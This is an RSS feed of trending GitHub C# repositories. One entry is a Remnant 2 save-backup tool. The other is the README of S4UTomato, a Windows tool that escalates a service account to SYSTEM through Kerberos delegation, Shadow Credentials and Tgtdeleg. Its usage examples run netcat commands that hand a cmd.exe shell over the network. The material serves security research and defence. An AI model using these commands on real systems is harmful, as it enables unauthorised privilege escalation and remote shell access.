<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C# Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-08-02T01:30:04Z</updated>
  <subtitle>Daily Trending of C# in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Razzmatazzz/RemnantSaveGuardian</title>
    <updated>2023-08-02T01:30:04Z</updated>
    <id>tag:github.com,2023-08-02:/Razzmatazzz/RemnantSaveGuardian</id>
    <link href="https://github.com/Razzmatazzz/RemnantSaveGuardian" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Tool to backup your saves and view your world rolls&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Remnant Save Guardian&lt;/h1&gt; &#xA;&lt;p&gt;Back up your Remnant 2 saves and view your world rolls.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;This project is a work in progress. Lots of features are broken or partially implemented.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download and install the &lt;a href=&#34;https://dotnet.microsoft.com/en-us/download/dotnet-framework&#34;&gt;Microsoft .NET Framework 4.8&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Download the &lt;a href=&#34;https://github.com/Razzmatazzz/RemnantSaveGuardian/releases/latest&#34;&gt;latest release&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Unzip the latest release to a folder of your choosing (probably not the same folder where you have the game installed)&lt;/li&gt; &#xA; &lt;li&gt;Run RemnantSaveGuardian.exe&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Known Issues&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Many events do not have the corresponding items they drop. It&#39;s a manual process to add those, so it will take some time.&lt;/li&gt; &#xA; &lt;li&gt;Many events and items do not have well-formatted names. Again, it&#39;s a manual process to add those.&lt;/li&gt; &#xA; &lt;li&gt;The world analyzer might not be updating automatically as it should be.&lt;/li&gt; &#xA; &lt;li&gt;Sometimes events from the campaign get incorrectly allocated to adventure&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Thanks for @crackedmind for the inflation code to convert saves into partial plaintext.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>wh0amitz/S4UTomato</title>
    <updated>2023-08-02T01:30:04Z</updated>
    <id>tag:github.com,2023-08-02:/wh0amitz/S4UTomato</id>
    <link href="https://github.com/wh0amitz/S4UTomato" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Escalate Service Account To LocalSystem via Kerberos&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;S4UTomato&lt;/h1&gt; &#xA;&lt;p&gt;Escalate Service Account To LocalSystem via Kerberos.&lt;/p&gt; &#xA;&lt;h1&gt;Traditional Potatoes&lt;/h1&gt; &#xA;&lt;p&gt;Friends familiar with the &#34;Potato&#34; series of privilege escalation should know that it can elevate service account privileges to local system privileges. The early exploitation techniques of &#34;Potato&#34; are almost identical: leveraging certain features of COM interfaces, deceiving the NT AUTHORITY\SYSTEM account to connect and authenticate to an attacker-controlled RPC server. Then, through a series of API calls, an intermediary (NTLM Relay) attack is executed during this authentication process, resulting in the generation of an access token for the NT AUTHORITY\SYSTEM account on the local system. Finally, this token is stolen, and the &lt;code&gt;CreateProcessWithToken()&lt;/code&gt; or &lt;code&gt;CreateProcessAsUser()&lt;/code&gt; function is used to pass the token and create a new process to obtain SYSTEM privileges.&lt;/p&gt; &#xA;&lt;h1&gt;How About Kerberos&lt;/h1&gt; &#xA;&lt;p&gt;In any scenario where a machine is joined to a domain, you can leverage the aforementioned techniques for local privilege escalation as long as you can run code under the context of a Windows service account or a Microsoft virtual account, provided that the Active Directory hasn&#39;t been hardened to fully defend against such attacks.&lt;/p&gt; &#xA;&lt;p&gt;In a Windows domain environment, SYSTEM, NT AUTHORITY\NETWORK SERVICE, and Microsoft virtual accounts are used for authentication by system computer accounts that are joined to the domain. Understanding this is crucial because in modern versions of Windows, most Windows services run by default using Microsoft virtual accounts. Notably, IIS and MSSQL use these virtual accounts, and I believe other applications might also employ them. Therefore, we can abuse the S4U extension to obtain the service ticket for the domain administrator account &#34;Administrator&#34; on the local machine. Then, with the help of James Forshaw (&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;@tiraniddo&lt;/a&gt;)&#39;s &lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;&lt;em&gt;SCMUACBypass&lt;/em&gt;&lt;/a&gt;, we can use that ticket to create a system service and gain SYSTEM privileges. This achieves the same effect as traditional methods used in the &#34;Potato&#34; family of privilege escalation techniques.&lt;/p&gt; &#xA;&lt;p&gt;Before this, we need to obtain a TGT (Ticket Granting Ticket) for the local machine account. This is not easy because of the restrictions imposed by service account permissions, preventing us from obtaining the computer&#39;s Long-term Key and thus being unable to construct a KRB_AS_REQ request. To accomplish the aforementioned goal, I leveraged three techniques: &lt;a href=&#34;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&#34;&gt;&lt;em&gt;Resource-based Constrained Delegation&lt;/em&gt;&lt;/a&gt;, &lt;a href=&#34;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&#34;&gt;&lt;em&gt;Shadow Credentials&lt;/em&gt;&lt;/a&gt;, and &lt;a href=&#34;https://twitter.com/gentilkiwi/status/998219775485661184&#34;&gt;&lt;em&gt;Tgtdeleg&lt;/em&gt;&lt;/a&gt;. I built my project based on the &lt;a href=&#34;https://github.com/GhostPack/Rubeus#tgtdeleg&#34;&gt;Rubeus&lt;/a&gt; toolset.&lt;/p&gt; &#xA;&lt;h1&gt;How to Use and Examples&lt;/h1&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;C:\Users\whoami\Desktop&amp;gt;S4UTomato.exe --help&#xA;&#xA;S4UTomato 1.0.0-beta&#xA;Copyright (c) 2023&#xA;&#xA;  -d, --Domain              Domain (FQDN) to authenticate to.&#xA;  -s, --Server              Host name of domain controller or LDAP server.&#xA;  -m, --ComputerName        The new computer account to create.&#xA;  -p, --ComputerPassword    The password of the new computer account to be created.&#xA;  -f, --Force               Forcefully update the &#39;msDS-KeyCredentialLink&#39; attribute of the computer&#xA;                            object.&#xA;  -c, --Command             Program to run.&#xA;  -v, --Verbose             Output verbose debug information.&#xA;  --help                    Display this help screen.&#xA;  --version                 Display version information.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;LEP via Resource-based Constrained Delegation&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c &#34;nc.exe 127.0.0.1 4444 -e cmd.exe&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/S4UTomato/master/images/rbcd.gif&#34; alt=&#34;rbcd&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;LEP via Shadow Credentials + S4U2self&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;S4UTomato.exe shadowcred -c &#34;nc 127.0.0.1 4444 -e cmd.exe&#34; -f&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/S4UTomato/master/images/shadowcred.gif&#34; alt=&#34;shadowcred&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;LEP via Tgtdeleg + S4U2self&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-cmd&#34;&gt;# First retrieve the TGT through Tgtdeleg&#xA;S4UTomato.exe tgtdeleg&#xA;# Then run SCMUACBypass to obtain SYSTEM privilege&#xA;S4UTomato.exe krbscm -c &#34;nc 127.0.0.1 4444 -e cmd.exe&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/wh0amitz/S4UTomato/master/images/tgtdeleg.gif&#34; alt=&#34;tgtdeleg&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>